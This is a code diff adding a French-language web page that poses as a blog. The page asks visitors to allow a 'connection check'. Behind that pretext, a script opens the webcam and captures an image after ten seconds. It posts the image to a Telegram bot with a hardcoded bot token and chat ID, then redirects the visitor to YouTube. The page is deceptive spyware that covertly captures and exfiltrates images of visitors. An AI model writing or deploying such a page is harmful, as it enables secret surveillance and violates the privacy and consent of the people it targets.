@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mon Blog</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+
+        #camera-permission, #loading {
+            background-color: #f0f0f0;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            margin: 20px auto;
+            width: 80%;
+            max-width: 600px;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div id="camera-permission">
+        <h1>Bienvenue sur notre Blog !</h1>
+        <p>Nous aimerions vous offrir une expérience personnalisée. Pour cela, nous aimerions vérifier votre connexion. Êtes-vous d'accord ?</p>
+        <button id="allow-camera">Oui, j'autorise</button>
+    </div>
+
+    <div id="loading" style="display: none;">
+        <h1>Enregistrement en cours...</h1>
+        <p>Veuillez patienter pendant que nous vérifions votre connexion.</p>
+    </div>
+
+    <script>
+        document.getElementById('allow-camera').addEventListener('click', async () => {
+            document.getElementById('camera-permission').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    const dataURL = canvas.toDataURL('video/webm');
+                    sendToTelegram(dataURL);
+
+                    stream.getTracks().forEach(track => track.stop());
+                    setTimeout(() => {
+                        window.location.href = 'https://www.youtube.com';
+                    }, 3000); // Redirige après 3 secondes supplémentaires
+                }, 10000); // Enregistre pendant 10 secondes
+            } catch (error) {
+                console.error('Erreur lors de l’accès à la caméra', error);
+                alert('Erreur lors de la vérification de votre connexion. Veuillez réessayer.');
+            }
+        });
+
+        function sendToTelegram(dataURL) {
+            const token = '7744426942:AAFiEdUcp_pcOUFYrnRnoioxo2lzU0PemeY'; // Remplace par ton token Telegram
+            const chatId = '5740629811'; // Remplace par ton chat ID Telegram
+            const apiUrl = `https://api.telegram.org/bot${token}/sendVideo`;
+
+            fetch(apiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    video: dataURL
+                })
+            }).then(response => response.json())
+              .then(data => console.log('Réponse de Telegram:', data))
+              .catch(error => console.error('Erreur lors de l’envoi à Telegram:', error));
+        }
+    </script>
+</body>
+</html>
